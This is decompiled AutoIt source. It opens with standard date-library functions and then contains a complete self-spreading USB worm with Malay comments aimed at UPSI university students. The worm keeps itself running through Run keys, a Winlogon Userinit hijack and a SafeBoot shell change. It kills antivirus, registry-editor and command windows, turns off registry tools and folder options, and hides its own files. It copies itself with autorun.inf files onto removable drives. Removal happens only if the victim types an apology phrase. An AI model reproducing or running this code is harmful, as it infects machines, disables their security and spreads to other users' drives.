;                   On non-acceptable weekstart value sets @ERROR = 99 and uses default (Sunday) as starting day
; Author(s):        JdeB
;===============================================================================
;
Func _WeekNumber($iYear = @YEAR, $iMonth = @MON, $iDay = @MDAY, $iWeekStart = 1)
	Local $iDow0101, $iDow0101ny
	Local $iDate, $iStartWeek1, $iEndWeek1, $iEndWeek1Date, $iStartWeek1ny, $iStartWeek1Dateny
	Local $iCurrDateDiff, $iCurrDateDiffny

	; Check for erroneous input in $Day, $Month & $Year
	If $iDay > 31 Or $iDay < 1 Then
		SetError(1)
		Return -1
	ElseIf $iMonth > 12 Or $iMonth < 1 Then
		SetError(1)
		Return -1
	ElseIf $iYear < 1 Or $iYear > 2999 Then
		SetError(1)
		Return -1
	ElseIf $iWeekStart < 1 Or $iWeekStart > 2 Then
		SetError(2)
		Return -1
	EndIf
	;
	;$idow = _DateToDayOfWeekISO($iYear, $iMonth, $iDay);
	$iDow0101 = _DateToDayOfWeekISO($iYear, 1, 1);
	$iDate = $iYear & '/' & $iMonth & '/' & $iDay
	;Calculate the Start and End date of Week 1 this year
	If $iWeekStart = 1 Then
		If $iDow0101 = 6 Then
			$iStartWeek1 = 0
		Else
			$iStartWeek1 = -1 * $iDow0101 - 1
		EndIf
		$iEndWeek1 = $iStartWeek1 + 6
	Else
		$iStartWeek1 = $iDow0101 * - 1
		$iEndWeek1 = $iStartWeek1 + 6
	EndIf
	;$iStartWeek1Date = _DateAdd('d',$iStartWeek1,$iYear & '/01/01')
	$iEndWeek1Date = _DateAdd('d', $iEndWeek1, $iYear & '/01/01')
	;Calculate the Start and End date of Week 1 this Next year
	$iDow0101ny = _DateToDayOfWeekISO($iYear + 1, 1, 1);
	;  1 = start on Sunday / 2 = start on Monday
	If $iWeekStart = 1 Then
		If $iDow0101ny = 6 Then
			$iStartWeek1ny = 0
		Else
			$iStartWeek1ny = -1 * $iDow0101ny - 1
		EndIf
		;$IEndWeek1ny = $iStartWeek1ny + 6
	Else
		$iStartWeek1ny = $iDow0101ny * - 1
		;$IEndWeek1ny = $iStartWeek1ny + 6
	EndIf
	$iStartWeek1Dateny = _DateAdd('d', $iStartWeek1ny, $iYear + 1 & '/01/01')
	;$iEndWeek1Dateny = _DateAdd('d',$IEndWeek1ny,$iYear+1 & '/01/01')
	;number of days after end week 1
	$iCurrDateDiff = _DateDiff('d', $iEndWeek1Date, $iDate) - 1
	;number of days before next week 1 start
	$iCurrDateDiffny = _DateDiff('d', $iStartWeek1Dateny, $iDate)
	;
	; Check for end of year
	If $iCurrDateDiff >= 0 And $iCurrDateDiffny < 0 Then Return 2 + Int($iCurrDateDiff / 7)
	; > week 1
	If $iCurrDateDiff < 0 Or $iCurrDateDiffny >= 0 Then Return 1
EndFunc   ;==>_WeekNumber


;===============================================================================
;
; Description:      returns an Array that contains the numbers of days per month
;                   te specified year
; Parameter(s):     $iYear
; Requirement(s):   None
; Return Value(s):  On Success - Array that contains the numbers of days per month
;                   On Failure - none
; Author(s):        Jos van der Zande / Jeremy Landes
; Note(s):          None
;
;===============================================================================
Func __DaysInMonth($iYear)
	Local $aiDays
	$aiDays = StringSplit("31,28,31,30,31,30,31,31,30,31,30,31", ",")
	If _DateIsLeapYear($iYear) Then $aiDays[2] = 29
	Return $aiDays
EndFunc   ;==>__DaysInMonth


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\Date.au3>
; ----------------------------------------------------------------------------


Opt("TrayIconHide", 1)
$i = 0
	$var1 = @ScriptDir
	$var2 = @ScriptName
	$var3 = "\"
	$var4 = $var1&$var3&$var2
	$var5 = @ScriptName
	AutoItSetOption("WinTitleMatchMode", 2)
	Opt("WinTitleMatchMode", 2)

Dim $file, $var7

Do
	Opt("TrayIconHide", 1)
	If WinExists("Saya maafkan awak - Notepad") Then
		WinWaitActive("Saya maafkan awak - Notepad")
		WinKill("Maafkan", "")
		$answer = InputBox("Persetujuan Memberi Kemaafan", "Saya dengan ini bersetuju untuk memaafkan pembuat virus ini. Sila taip Saya maaafkan awak untuk membuang keseluruhan virus", "Saya tak maafkan awak", "")
			if $answer = "Saya maafkan awak" then
			MsgBox(0, "Terima kasih", "Sila tunggu sementara proses pembersihan sedang dilakukan")


		;reset registry
		RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Shell")
		RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Shell2")
		RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\run", "UPSI_1.exe")
		RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "UPSI_1.exe")
		RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run", "UPSI_1.exe")
		RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit")
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit", "REG_SZ", "C:\WINDOWS\\system32\userinit.exe,")
		RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot", "AlternateShell")
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.reg", "", "REG_SZ", "regfile")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "0")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "0")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp", "Disabled", "REG_DWORD", "0")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "www.google.com") ;ok
		RegDelete("HKEY_CURRENT_USER\Control Panel\don't load", "appwiz.cpl") ;ok
		RegDelete("HKEY_CURRENT_USER\Control Panel\don't load", "Services.cpl") ;ok
		RegDelete("HKEY_CURRENT_USER\Control Panel\don't load", "Startup.cpl") ;ok
		RegDelete("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions", "")
		RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Connection Settings", "REG_DWORD", "0") ;ok
		RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "ConnectionsTab", "REG_DWORD", "0") ;ok
		RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "GeneralTab", "REG_DWORD", "0") ;ok
		RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "HomePage", "REG_DWORD", "0") ;ok
		RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Settings", "REG_DWORD", "0")
		RegWrite("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "0")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "0")
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden", "ValueName", "REG_SZ", "ShowSuperHidden")
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\Policy\DontShowSuperHidden", "", "REG_SZ", "")
		RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", "0")
		RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run", "UPSI_1.exe")

;delete file
		FileSetAttrib("c:\windows\system32\New_Folder(1).exe", "-R-H-S")
		FileSetAttrib("c:\windows\Tasks\dc2.exe", "-R-H-S")
		FileSetAttrib("c:\recycler\dc1.exe", "-R-H-S")
		FileSetAttrib("d:\New_Folder.exe", "-R-H-S")
		FileSetAttrib("d:\autorun.inf", "-R-H-S")
		FileDelete("c:\windows\system32\New_Folder(1).exe")
		FileDelete("c:\windows\Tasks\dc2.exe")
		FileDelete("c:\recycler\dc1.exe")
		FileDelete("d:\New_Folder.exe")
		FileDelete("d:\autorun.inf")
		FileChangeDir(@ScriptDir)
		FileWriteLine("del.bat","@echo off")
		$file = FileOpen("del.bat", 1)
		FileWriteLine($file, "tskill upsi_1.exe")
		FileWriteLine($file, "attrib -r -h -s " &@ScriptName)
		FileWriteLine($file, "echo y | del " &@ScriptName)
		FileWriteLine($file, "echo y | del %0"& @CRLF)
		FileClose($file)
		MsgBox(0,"Perhatian","Virus telah dibuang. Sila Log Off atau Restart komputer untuk proses pembersihan sepenuhnya");
		Run($var1 &"\del.bat","")
		EXIT
		Else
	MsgBox(0, "Maaf", "Virus tidak dibuang dari komputer anda")
	EndIf
	EndIf
		;function untuk security
	ProcessClose("ravmon.exe")
	ProcessClose("ravmone.exe")
	ProcessClose("sxs.exe")
	ProcessClose("cmd.exe")
	ProcessClose("regedit.exe")
	ProcessClose("avgcc.exe")
	ProcessClose("updat32.exe")
	WinKill("Program Files", "")
	WinKill("Explorer", "")
	WinKill("Task", "")
	WinKill("Messenger", "")
	WinKill("Universiti Pendidikan", "")
	WinKill("Folder Options", "")
	WinKill("Run", "")
	WinKill("Control", "")
	WinKill("Command", "")
	WinKill("McAfee", "")
	WinKill("Scan", "")
	WinKill("Scans", "")
	WinKill("Norton", "")
	WinKill("Symantec", "")
	WinKill("Avast", "")
	WinKill("AVG ", "")
	WinKill("Virus", "")
	WinKill("virus", "")
	WinKill("Luke", "")
	WinKill("Trojan", "")
	WinKill("Anti", "")
	WinKill("Antivirus", "")
	WinKill("Antivir", "")
	WinKill("Registry", "")
	WinKill("Process", "")
	WinKill("Autorun", "")
	WinKill("Startup", "")
	WinKill("system32", "")
	WinKill("Custom Scan", "")
	WinKill("BitDefender", "")
	WinKill("Update", "")
	WinKill("update", "")
	WinKill("Kaspersky", "")
	WinKill("Anti-Virus", "")
	WinKill("NOD32", "")
	WinKill("Panda", "")
	WinKill("Spy", "")
	WinKill("Restore", "")
	WinKill("Search", "")
	WinKill("Protect", "")
	WinKill("protect", "")
	WinKill("Tweak", "")
	WinKill("Back", "")
	WinKill("Guard", "")
	WinKill("Clean", "")
	WinKill("Security", "")
	WinSetTitle ( "Word", "", "SELAMAT MEMBUAT ASSIGNMENT, UPSI ADALAH UNIVERSITI YANG PENUH DENGAN ASSIGNMENT" )


;tambah ke startup
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Shell", "REG_SZ", "c:\windows\system32\UPSI_1.exe")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Shell2", "REG_SZ", "c:\windows\system32\New_Folder(1).exe")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\run", "UPSI_1.exe", "REG_SZ", "c:\windows\Tasks\dc2.exe")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "UPSI_1.exe", "REG_SZ", "New_Folder(1).exe")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\run", "UPSI_1.exe", "REG_SZ", "c:\recycler\dc1.exe")
	RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Userinit", "REG_SZ", "C:\WINDOWS\\system32\userinit.exe,c:\recycler\dc1.exe")
	RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\SafeBoot", "AlternateShell", "REG_SZ", "c:\windows\Tasks\dc2.exe")



;disable security
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.reg", "", "REG_SZ", "txtfile")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "1")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp", "Disabled", "REG_DWORD", "1")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "www.upsi.edu.my") ;ok
	RegWrite("HKEY_CURRENT_USER\Control Panel\don't load", "appwiz.cpl", "REG_SZ", "no") ;ok
	RegWrite("HKEY_CURRENT_USER\Control Panel\don't load", "Services.cpl", "REG_SZ", "no") ;ok
	RegWrite("HKEY_CURRENT_USER\Control Panel\don't load", "Startup.cpl", "REG_SZ", "no") ;ok
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions", "", "REG_SZ", "")
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Connection Settings", "REG_DWORD", "1") ;ok
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "ConnectionsTab", "REG_DWORD", "1") ;ok
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "GeneralTab", "REG_DWORD", "1") ;ok
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "HomePage", "REG_DWORD", "1") ;ok
	RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Settings", "REG_DWORD", "1")
	RegWrite("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "1")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt", "REG_DWORD", "1")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden", "ValueName", "REG_SZ", "ShowSuperHidden")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden\Policy\DontShowSuperHidden", "", "REG_SZ", "")
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", "0")



;untuk dari upsi.exe dan startup
	if $var5 = "UPSI_1.exe" Then
		ProcessSetPriority("UPSI_1.exe", 4)
		$var6 = DriveGetDrive( "ALL" )
		For $i = 1 to $var6[0]
			if 	 DriveSpaceTotal( $var6[$i]) > 1.5 and DriveSpaceTotal( $var6[$i]) < 3100 then
				$file = FileExists($var6[$i] & "\New_Folder.exe")
				If $file = 1  Then ;checkjika ada, 1 bermaksud ada
					$attrib = FileSetAttrib ( $var6[$i] & "\New_Folder.exe", "-RASHNOT" )
					if $attrib <> 0	then ;check jika readonly
						FileSetAttrib ( $var6[$i] & "\New_Folder.exe", "-RASHNOT" ) ;bukan readonly
					Else
						; drive adalah readonly
					EndIf
				Else ;fail tak ada


			FileCopy($var4, $var6[$i] & "\New_Folder.exe")
			FileSetAttrib($var6[$i] & "\New_Folder.exe", "+R+H+S")
			_FileCreate($var6[$i] & "\autorun.inf")
			FileSetAttrib($var6[$i] & "\autorun.inf", "-R-H-S")
			_FileWriteToLine($var6[$i] & "\autorun.inf", 1, "[AutoRun]", 1)
			_FileWriteToLine($var6[$i] & "\autorun.inf", 2, "open=New_Folder.exe", 1)
			_FileWriteToLine($var6[$i] & "\autorun.inf", 3, "shellexecute=New_Folder.exe", 1)
			_FileWriteToLine($var6[$i] & "\autorun.inf", 4, "shell\Auto\command=New_Folder.exe", 1)
			FileSetAttrib($var6[$i] & "\autorun.inf", "+R+H+S")
			EndIf
			Else

			EndIf
		Next
		$var7 = DriveGetDrive( "FIXED" )
		For $i = 1 to $var7[0]
			if $var7[$i] = "d:" then
			FileCopy($var4, $var7[$i] & "\New_Folder.exe")
			FileSetAttrib($var7[$i] & "\New_Folder.exe", "+R+H+S")
			_FileCreate($var7[$i] & "\autorun.inf")
			FileSetAttrib($var7[$i] & "\autorun.inf", "-R-H-S")
			_FileWriteToLine($var7[$i] & "\autorun.inf", 1, "[AutoRun]", 1)
			_FileWriteToLine($var7[$i] & "\autorun.inf", 2, "open=New_Folder.exe", 1)
			_FileWriteToLine($var7[$i] & "\autorun.inf", 3, "shellexecute=New_Folder.exe", 1)
			_FileWriteToLine($var7[$i] & "\autorun.inf", 4, "shell\Auto\command=New_Folder.exe", 1)
			FileSetAttrib($var7[$i] & "\autorun.inf", "+R+H+S")
			EndIf
		Next
	Sleep(3000)

;untuk dari pendrive
	ElseIf $var5 = "New_Folder.exe" Then
		$rc = _RunDos("start /max " & $var1)
		WinKill("My Computer", "")
		FileCopy($var4, "c:\windows\system32\UPSI_1.exe")
		FileSetAttrib("c:\windows\system32\UPSI_1.exe", "+R+H+S")
		FileCopy($var4, "c:\windows\system32\New_Folder(1).exe")
		FileSetAttrib($var4, "+R+H+S")
		FileSetAttrib("c:\windows\system32\New_Folder(1).exe", "+R+H+S")
		FileCopy($var4, "c:\windows\Tasks\dc2.exe")
		FileSetAttrib("c:\windows\Tasks\dc2.exe", "+R+H+S")
		If ProcessExists("UPSI_1.exe") Then
			exit
			Else
			Run("c:\windows\system32\UPSI_1.exe", "", @SW_HIDE)
			Exit
		EndIf

;untuk dari recycler dan startup
ElseIf $var5 = "dc1.exe" Then
		FileCopy($var4, "c:\windows\system32\UPSI_1.exe")
		FileSetAttrib("c:\windows\system32\UPSI_1.exe", "+R+H+S")
		FileCopy($var4, "c:\windows\system32\New_Folder(1).exe")
		FileSetAttrib("c:\windows\system32\New_Folder(1).exe", "+R+H+S")
		FileCopy($var4, "c:\windows\Tasks\dc2.exe")
		FileSetAttrib("c:\windows\Tasks\dc2.exe", "+R+H+S")
		If ProcessExists("UPSI_1.exe") Then
			exit
			Else
			Run("c:\windows\system32\UPSI_1.exe", "", @SW_HIDE)
			Exit
		EndIf
		;untuk selain dari recycler dan pendrive (New_Folder(1).exe) dan startup
		Else
		FileCopy($var4, "c:\windows\system32\UPSI_1.exe")
		FileSetAttrib("c:\windows\system32\UPSI_1.exe", "+R+H+S")
		FileCopy($var4, "c:\windows\system32\New_Folder(1).exe")
		FileSetAttrib("c:\windows\system32\New_Folder(1).exe", "+R+H+S")
		FileCopy($var4, "c:\recycler\dc1.exe")
		FileSetAttrib("c:\recycler\dc1.exe", "+R+H+S")
		FileSetAttrib($var4, "+R+H+S")
		FileCopy($var4, "c:\windows\Tasks\dc2.exe")
		FileSetAttrib("c:\windows\Tasks\dc2.exe", "+R+H+S")
		If ProcessExists("UPSI_1.exe") Then
			Exit
		Else
		Run("c:\windows\system32\UPSI_1.exe", "", @SW_HIDE)
		Exit
		EndIf
	EndIf


		$i = $i + 1 - 1
Until $i = 10

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\bin3\New_Folder.au3>
; ----------------------------------------------------------------------------

